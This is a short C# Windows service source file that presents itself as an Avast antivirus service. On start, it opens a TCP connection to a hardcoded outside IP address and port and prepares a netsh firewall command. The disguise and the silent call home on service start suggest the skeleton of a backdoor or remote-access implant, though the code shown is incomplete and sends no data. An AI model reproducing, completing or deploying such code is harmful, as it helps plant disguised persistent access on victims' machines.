using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading;

namespace Avast_Service
{
    public partial class AvastService : ServiceBase
    {

        public static Thread MainThread;
        public static TcpClient ClienteSocket;

        public AvastService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            ProcessStartInfo PSI = new ProcessStartInfo("NetSh", " Advfirewall set allprofiles state on");
            ClienteSocket = new TcpClient("190.105.214.230", 8081);
            this.CanHandlePowerEvent = true;
            this.CanHandleSessionChangeEvent = true;
            this.CanPauseAndContinue = true;
            this.CanShutdown = true;
            
            
        }

        protected override void OnStop()
        {
        }
    }
}
